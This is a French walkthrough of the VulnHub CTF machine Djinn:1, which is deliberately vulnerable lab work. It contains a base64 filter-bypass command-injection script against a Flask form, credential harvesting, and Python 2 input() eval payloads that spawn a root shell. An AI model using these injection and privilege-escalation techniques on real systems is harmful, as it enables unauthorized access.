# Solution du CTF Djinn: 1 de VulnHub

[djinn](https://www.vulnhub.com/entry/djinn-1,397/) premier du nom est un CTF proposé sur VulnHub et créé par [mzfr](https://twitter.com/0xmzfr). Le CTF était intéressant, requiert un peu de programmation ou à défaut d'être en mesure de trouver des failles auxquelles l'auteur n'a pas du penser.

Allez, c'est parti !

```
Nmap scan report for 192.168.242.133
Host is up (0.00069s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.242.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   filtered ssh
1337/tcp open     waste?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|     '/', 5)
|   RPCCheck: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '/', 8)
7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
|_http-title: Lost in space
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
```

## Va faire tes devoirs

Il y a un service custom sur le port 1337. Je commence par ça et j'irais voir le contenu du FTP après.

```shellsession
$ ncat 192.168.242.133 1337 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.242.133:1337.
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|


Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(4, '+', 5)
> 9
(9, '-', 1)
> 8
(9, '/', 9)
> 1
```

On a donc une suite d'opétations arithmétiques à solutionner avant de se voir donner un cadeau (un shell peut être ?). J'ai utilisé la librairie [pwnlib](https://docs.pwntools.com/en/stable/about.html#module-pwnlib) du projet `pwntools` car il y a des méthodes bien pratiques pour lire sur une socket jusqu'à obtenir un pattern particulier. A l'exécution il s'est avéré qu'il y avait en réalité 1001 opérations.

```python
import string
import re
from collections import Counter

from pwnlib.tubes.remote import remote

OPE_REGEX = re.compile(rb"\((\d+), '([+\*/-])', (\d+)\)")

r = remote("192.168.242.133", 1337)
for i in range(1001):
    buff = r.recvregex(OPE_REGEX)
    left_value, operand, right_value = OPE_REGEX.search(buff).groups()
    left_value = int(left_value)
    right_value = int(right_value)
    if operand == b"+":
        result = left_value + right_value
    elif operand == b"-":
        result = left_value - right_value
    elif operand == b"/":
        result = left_value // right_value
    elif operand == b"*":
        result = left_value * right_value

    r.send(str(result).encode() + b"\n")

buff = b""
while True:
    try:
        buff += r.recv(2048)
    except EOFError:
        break

print(buff.decode())

r.close()
```

Le résultat obtenu n'est pas des identifiants mais une suite de chiffres :

```shellsession
$ python djinn.py 

> Here is your gift, I hope you know what to do with it:

1356, 6784, 3409
```

Vraisemblablement ce sont des numéros de port, il y a donc du port-knocking ans l'air. Si on tape sur les ports de la VM dans l'ordre :

```bash
ncat -v -z 192.168.242.133 1356;  ncat -v -z 192.168.242.133 6784; ncat -v -z 192.168.242.133 3409
```

et que l'on rescanne avec Nmap, on voit un nouveau port ouvert :

```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b8cb141505a02443d58e6dbd97c063e9 (RSA)
|   256 d570dd8162e4fe941b65bf773ae18126 (ECDSA)
|_  256 6a2aba9cbab22e199f5c1c87740a25f0 (ED25519)
```

## Roger that

C'est bien beau mais je n'ai toujours pas d'identifiants. Il est temps de regarder le FTP.

game.xt

> oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the    
> final level and get the prize.

message.txt

> @nitish81299 I am going on holidays for few days, please take care of all the work.

creds.txt

> nitu:81299

Aucun de ces identifiants ne fonctionne que ce soit sur le FTP ou ne désourmais ouvert SSH.

## Faites un veu

Sur le port 7331 se trouve une page web sans liens ni formulaires. Une énumération permet de trouver une page wish qui contient un formulaire :

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Make wishes</title>
</head>

<body>
  <form method="POST" action="/wish">
  <p>Oh you found me then go on make a wish.</p>

   <p>This can make all your wishes come true</p>


    Execute: <input type="text" name="cmd" required><br>
    <input type="submit" value="Submit">
    </form>
</body>

</html>
```

Si on tape une commande comme `id` on obtient une erreur 403 mais en regardant attentivement la page web (qui est assez sombre) on peut voir que le résultat dans la page :

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

On remarque aussi que l'on n'est plus sur ma même page : la soumission de la commande sur `/wish` provoque une redirection sur l'URL `/genie` avec l'output de la commande. C'est à dire que l'on a l'entête suivant :

```http
Location: http://192.168.242.133:7331/genie?name=uid%3D33%28www-data%29+gid%3D33%28www-data%29+groups%3D33%28www-data%29%0A
```

L'autre point c'est que certains mots clés semblent filtrés, ainsi la commande `ls /etc` provoque un message `Wrong choise of words`

Ce filtrage est facilement bypassé en faisant un `echo notre_commande_encodée_en_base64 | base64 -d | sh`

J'ai écrit ce petit script qui donne un semblant de shell :

```python
from urllib.parse import unquote_plus                                                                                  
from base64 import b64encode                                                                                           

import requests                                                                                                        
from requests.exceptions import RequestException                                                                       

sess = requests.session()                                                                                              
while True:                                                                                                            
    cmd = input("$ ").strip()                                                                                          
    if cmd == "quit":                                                                                                  
        break                                                                                                          

    cmd = b64encode(cmd.encode()).decode()                                                                             
    cmd = f"echo {cmd}|base64 -d|sh"                                                                                   
    response = sess.post(                                                                                              
        "http://192.168.242.133:7331/wish",                                                                            
        data={"cmd": cmd},                                                                                             
        allow_redirects=False                                                                                          
    )                                                                                                                  
    output = unquote_plus(response.headers["Location"].split("genie?name=")[1])                                        
    print(output)
```

Je remarque deux utilisateurs sur le système :

```
sam:x:1000:1000:sam,,,:/home/sam:/bin/bash
nitish:x:1001:1001::/home/nitish:/bin/bash
```

On peut jeter un coup d'oeil à l'appli Flask pour mieux comprendre la filtrage qui était présent :

```python
import subprocess

from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)
app.secret_key = "key"

CREDS = "/home/nitish/.dev/creds.txt"

RCE = ["/", ".", "?", "*", "^", "$", "eval", ";"]


def validate(cmd):
    if CREDS in cmd and "cat" not in cmd:
        return True

    try:
        for i in RCE:
            for j in cmd:
                if i == j:
                    return False
        return True
    except Exception:
        return False


@app.route("/", methods=["GET"])
def index():
    return render_template("main.html")


@app.route("/wish", methods=['POST', "GET"])
def wish():
    execute = request.form.get("cmd")
    if execute:
        if validate(execute):
            output = subprocess.Popen(execute, shell=True,
                                      stdout=subprocess.PIPE).stdout.read()
        else:
            output = "Wrong choice of words"

        return redirect(url_for("genie", name=output))
    else:
        return render_template('wish.html')


@app.route('/genie', methods=['GET', 'POST'])
def genie():
    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = "It's not that hard"

    return render_template('genie.html', file=page)


if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True)
```

Le plus intéressant c'est la mention d'un fichier `/home/nitish/.dev/creds.txt` utilisé nul part et qui contient des identifiants :

```
nitish:p4ssw0rdStr3r0n9
```

Cette fois on a notre shell et le premier flag :

```
nitish@djinn:~$ cat user.txt 
10aay8289ptgguy1pvfa73alzusyyx3c
```

## Le genie du shell

```
nitish@djinn:/opt/80$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
```

On peut exécuter ce binaire avec les droits de l'utilisateur `sam`. Le binaire en question est un ELF qui a été généré à partir de code Python (on voit plein des fonctions `Py*` dans les imports, etc)

Normalement `PyInstaller` permet via un utilitaire [pyi-archive_viewer](https://pyinstaller.org/en/v3.3.1/advanced-topics.html#using-pyi-archive-viewer) d'extraire le code Python compilé de l'ELF. Malheureusement dans notre cas ça ne fonctionne pas.

L'usage du binaire `/usr/bin/genie` est le suivant :

```shellsession
$ /usr/bin/genie -h
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish

I know you've came to me bearing wishes in mind. So go ahead make your wishes.

positional arguments:
  wish                  Enter your wish

optional arguments:
  -h, --help            show this help message and exit
  -g, --god             pass the wish to god
  -p SHELL, --shell SHELL
                        Gives you shell
  -e EXEC, --exec EXEC  execute command
```

Quand on joue un peu avec les options on obtient des messages comme `You are a noob hacker!!` ou `Continue praying!!`, etc. On remarque une temporisation qui s'explique par l'exécution d'une commande `ping` (comme on le devine en appliquant `strings` sur le fichier) :

```
We've added your wish to our records.
Pass your wish to GOD, he might be able to help you.
I know you've came to me bearing wishes in mind. So go ahead make your wishes.
/bin/ping google.com >/dev/null
You are a noob hacker!!
pass the wish to god
cline_in_traceback
Continue praying!!
execute command
--- snip ---
default
allowed
whoami
system
substr
string
parser
my man!!
main
--- snip ---
--exec
bash
args
--god
-cmd
/bin/
```

On note l'option `--cmd` non documentée. Enfin il y a aussi une page de manuelle sur le système qui en parle :

```
man(8)                                        genie man page                                        man(8)

NAME
       genie - Make a wish

SYNOPSIS
       genie [-h] [-g] [-p SHELL] [-e EXEC] wish

DESCRIPTION
       genie would complete all your wishes, even the naughty ones.

       We all dream of getting those crazy privelege escalations, this will even help you acheive that.

OPTIONS
       wish

              This is the wish you want to make .

       -g, --god

              Sometime we all would like to make a wish to god, this option let you make wish directly to God;

              Though genie can't gurantee you that your wish will be heard by God, he's a busy man you know;

       -p, --shell

              Well who doesn't love those. You can get shell. Ex: -p "/bin/sh"

       -e, --exec

              Execute command on someone else computer is just too damn fun, but this comes with some restrictions.

       -cmd

              You know sometime all you new is a damn CMD, windows I love you.

SEE ALSO
       mzfr.github.io

BUGS
       There are shit loads of bug in this program, it's all about finding one.

AUTHOR
       mzfr

1.0                                        11 November 2019                                        man(8)
```

Et effectivement c'était ce qui était attendu :

```shellsession
nitish@djinn:/tmp$ sudo -u sam /usr/bin/genie -cmd a
my man!!
$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
```

Dans le dossier de l'utilisateur on trouve un fichier caché qui est du code Python 2 compilé :

`.pyc: python 2.7 byte-compiled`

Comme sur un précédent CTF j'utilise une image Docker avec Python 3.6 pour y lancer `uncompyle6` car ce désassembleur Python a du mal avec les versions plus récentes. J'obtiens le code désassemblé suivant :

```python
from getpass import getuser
from os import system
from random import randint

def naughtyboi():
    print 'Working on it!! '


def guessit():
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
    else:
        print 'Better Luck next time'


def readfiles():
    user = getuser()
    path = input('Enter the full of the file to read: ')
    print 'User %s is not allowed to read %s' % (user, path)


def options():
    print 'What do you want to do ?'
    print '1 - Be naughty'
    print '2 - Guess the number'
    print '3 - Read some damn files'
    print '4 - Work'
    choice = int(input('Enter your choice: '))
    return choice


def main(op):
    if op == 1:
        naughtyboi()
    elif op == 2:
        guessit()
    elif op == 3:
        readfiles()
    elif op == 4:
        print 'work your ass off!!'
    else:
        print 'Do something better with your life'


if __name__ == '__main__':
    main(options())
```

Et `sam` peut, via une entrée sudo, exécuter le programme `/root/lago` qui correspond à ce code (on le voit lorsque l'on lance le programme avec sudo car sinon les permissions ne permettent pas de lire le fichier).

Il faut donc lancer l'exécutable et saisir un nombre entre 1 et 100 inclus jusqu'à ce qu'on ait suffisemment de chance pour obtenir notre shell.

J'ai décidé de mettre en oeuvre une solution automatisée mais pour cela il faut d'abord que je créé une clé SSH sans passphrase et je placerais la partie publique dans le `authorized_keys` de l'utilisateur :

```bash
ssh-keygen -b 2048 -t rsa -f key_no_pass -q -N ""
```

De cette façon je pourrais utiliser `pwnlib` pour accéder au compte SSH. Le code suivant va alors lancer la commande sudo et donner le chiffre *50* jusqu'à ce qu'il obtienne autre chose que le message d'échec. A ce moment il passe en interactif pour que je puisse utiliser le shell :

```python
from pwnlib.tubes.ssh import ssh                                                                                       

ssh_sess = ssh(host="192.168.242.133", user="sam", keyfile="key_no_pass")                            
while True:                                                                                                            
    p = ssh_sess.process(["sudo", "/root/lago"], tty=True)                                                             
    p.recvuntil(b"Enter your choice:")                                                                                 
    p.sendline(b"2")                                                                                                   
    p.recvuntil(b"Choose a number between 1 to 100:")                                                                  
    p.sendline(b"50")                                                                                                  
    p.sendline(b"id")                                                                                                  
    buff = p.recvline_contains((b"Better Luck", b"root"))                                                              
    if b"Better Luck next time" in buff:                                                                               
        continue                                                                                                       
    else:                                                                                                              
        print(buff)                                                                                                    
        p.interactive()                                                                                                
        break                                                                                                          
ssh_sess.close()
```

Ca tombe assez rapidement :

```shellsession
$ python brute_number.py 
b'Enter your number: # uid=0(root) gid=0(root) groups=0(root)'
# pwd
/home/sam
# cd /root
# ls
lago  proof.sh
```

L'exécution du `proof.sh` affiche le flag final.

## Kansas City Shuffle

Reprennons le code Python du lago vu plus tôt :

```python
    num = randint(1, 101)
    print 'Choose a number between 1 to 100: '
    s = input('Enter your number: ')
    if s == num:
        system('/bin/sh')
```

`num` est un entier car généré par `random.randint`. `s` devrait quand à lui être une chaine de caractères car c'est le résultat de `input()` par conséquent la comparaison de `s` et `num` devrait toujours échouer (on n'est pas sur du Javascript !)

On est là sur une particularité de Python 2 : la fonction `input()` évalue ce qui est lu comme du code Python (et donc si on saisi un chiffre on obtient un chiffre). Pour être safe il faut utiliser `raw_input()`.

Quoiqu'il en soit on peut exploiter cette particularité pour obtenir un shell sans avoir à deviner le nombre :

```shellsession
sam@djinn:~$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:system("/bin/bash")
root@djinn:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Maintenant voyons un peu le code qui tournait sur le port 1337 du début. J'en retrouve la piste dans `/etc` :

```shellsession
root@djinn:/root# grep -r -i flask  /etc/
/etc/systemd/system/lfi.service:ExecStart=/bin/bash -c "/usr/local/bin/flask run --host 0.0.0.0 --port 7331"
/etc/systemd/system/game.service:ExecStart=/bin/bash -c "/usr/local/bin/flask run --host 0.0.0.0 --port 1337"
```

L'auteur a créé un service systemd :

```systemd
[Unit]
Description=game
After=network.target

[Service]
User=root
WorkingDirectory=/opt/1337
ExecStart=/bin/bash -c "/usr/local/bin/flask run --host 0.0.0.0 --port 1337"
Restart=always

[Install]
WantedBy=multi-user.target
```

Le script a un entête Python 3 :

```python
#!/usr/bin/env python3
import sys
from random import choice, randint
from pyfiglet import print_figlet

def add(a,b): return a+b
def div(a,b): return int(a/b)
def multiply(a,b): return a*b
def sub(a,b): return a-b

print_figlet("Game Time")
print("Let's see how good you are with simple maths")
print("Answer my questions 1000 times and I'll give you your gift.")

OPERATIONS = ['+', '-', "/", "*"]

def main():
    for i in range(1001):
        a = randint(1,9)
        b = randint(1,9)
        op = choice(OPERATIONS)

        print(a,op,b)
        if op == "+":
            val = add(a,b)

        if op == "-":
            val = sub(a,b)

        if op == "/":
            val = div(a,b)

        if op == "*":
            val = multiply(a,b)

        try:
            In = int(input("> "))
        except Exception:
            print("Stop acting like a hacker for a damn minute!!")
            sys.exit(1)

        if In == val:
            continue
        else:
            print("Wrong answer")
            sys.exit(1)

    with open("/opt/1337/p0rt5", 'r') as f:
        print(f.read())


if __name__ == "__main__":
    main()
```

Et pourtant on pouvait bypasser tout le CTF :

```shellsession
$ ncat 192.168.242.133 1337 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.242.133:1337.
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|


Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(9, '+', 7)
> __import__("os").system("/bin/bash")
id
uid=0(root) gid=0(root) groups=0(root)
```

Ca s'explique par le fait que Flask va chercher le Python par défaut sur le système :

```shellsession
sam@djinn:~$ ls -al /usr/bin/python
lrwxrwxrwx 1 root root 9 Apr 16  2018 /usr/bin/python -> python2.7
```

Voici le code de `/usr/local/bin/flask` :

```python
#!/usr/bin/python

# -*- coding: utf-8 -*-
import re
import sys

from flask.cli import main

if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

On voit bien l'utilisation de l'interpréteur par défaut.
